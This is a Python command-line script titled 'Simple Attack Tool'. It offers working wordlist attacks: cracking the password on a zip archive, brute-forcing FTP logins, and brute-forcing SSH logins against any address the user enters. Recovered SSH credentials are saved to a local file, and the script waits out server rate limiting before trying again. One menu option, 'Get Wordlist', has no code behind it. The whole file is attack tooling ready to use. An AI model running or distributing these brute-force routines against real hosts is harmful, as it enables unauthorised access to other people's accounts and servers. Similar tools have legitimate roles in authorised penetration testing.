import os
from zipfile import ZipFile
from pathlib import Path
from tqdm import tqdm
import sys
from ftplib import FTP
import socket
import paramiko
import time  # Import missing module

def clear_screen():
    os.system("cls")

def display_banner(title):
    clear_screen()
    print(r"""                         
    .__           .__                         
    |  |__   ____ |  |   _____   ____   ______
    |  |  \ /  _ \|  |  /     \_/ __ \ /  ___/
    |   Y  (  <_> )  |_|  Y Y  \  ___/ \___ \ 
    |___|  /\____/|____/__|_|  /\___  >____  >
        \/                  \/     \/     \/                                   
                                """)
    print("\n****************************************************************")
    print(f"\n* {title} *")
    print("\n****************************************************************\n")

def crack_zip(wordlist_path, zip_path):
    try:
        with ZipFile(zip_path) as zip_file:
            with wordlist_path.open('rb') as file:
                pass_count = len(file.readlines())

            print(f'Total passwords to try: {pass_count:,}')

            with wordlist_path.open('rb') as file:
                for password in tqdm(file, total=pass_count, unit='Password'):
                    try:
                        zip_file.extractall(pwd=password.strip())
                    except:
                        continue
                    else:
                        print(f'\nPassword found: {password.decode().strip()}')
                        return
            print('Password not found. Try a different wordlist')
    except FileNotFoundError:
        print('Error: The path provided is incorrect or does not exist.')
        sys.exit(1)

def ftp_brute_force(target, username, wordlist):
    try:
        with wordlist.open("r") as f:
            words = f.readlines()
            for word in words:
                word = word.strip()
                try:
                    ftp = FTP(target)
                    ftp.login(username, word)
                    ftp.quit()
                    print(f"\n[Success] Username: {username}, Password: {word}")
                    return
                except:
                    pass
            print("\n[+] Brute Force Finished")
    except FileNotFoundError:
        print("\nThere is no wordlist")
        sys.exit(1)
    except Exception as e:
        print(f"\nAn error occurred: {e}")
        sys.exit(1)

def ssh_brute_force(target, user, wordlist_path):
    port = 22
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        with wordlist_path.open() as file:
            passwords = file.read().splitlines()

        for password in passwords:
            try:
                ssh.connect(hostname=target, username=user, password=password, port=port, timeout=3)
                print(f"\n[Success] Host: {target}, Login: {user}, Password: {password}")
                with open("credentials.txt", "a") as file:
                    file.write(f'Host: {target}, Login: {user}, Password: {password}\n')
                return
            except socket.timeout:
                print(f"\nConnection timed out for host: {target}")
            except paramiko.AuthenticationException:
                print(f"[ATTEMPT] host: {target} - login: {user} - password: {password}")
            except paramiko.SSHException:
                print("Too many requests. Waiting for 2 minutes.")
                time.sleep(120)
    except FileNotFoundError:
        print('The specified wordlist file does not exist.')
        sys.exit(1)
    except Exception as e:
        print(f"\nAn error occurred: {e}")
        sys.exit(1)

    print(f"No valid credentials found in {wordlist_path}")

def main():
    display_banner("Simple Attack Tool")

    respon = input("""\n Please enter tool of choice:
                    1. Zip Unlocker
                    2. Brute Force FTP
                    3. Brute Force SSH Login
                    4. Get Wordlist
    Input the Number: """)
    print("You have selected option:", respon)

    if respon == '1':
        display_banner("Zip Unlocker")
        wordlist_path = Path(input('Enter path to the wordlist file > '))
        zip_path = Path(input('Enter path to zipped file > '))
        if wordlist_path.exists() and zip_path.exists():
            crack_zip(wordlist_path, zip_path)
        else:
            print('Error: The path provided is incorrect or does not exist.')
            sys.exit(1)

    elif respon == '2':
        display_banner("FTP Brute Force")
        target = input('Enter IP Target > ')
        user = input('Enter Username > ')
        wordlist = Path(input('Enter path to wordlist file > '))
        ftp_brute_force(target, user, wordlist)

    elif respon == '3':
        display_banner("SSH Login Brute Force")
        target = input('Enter Target Address > ')
        user = input('Enter Username > ')
        wordlist_path = Path(input('Enter path to Wordlist > '))
        ssh_brute_force(target, user, wordlist_path)

    else:
        print("Invalid option selected.")
        sys.exit(1)

if __name__ == "__main__":
    main()
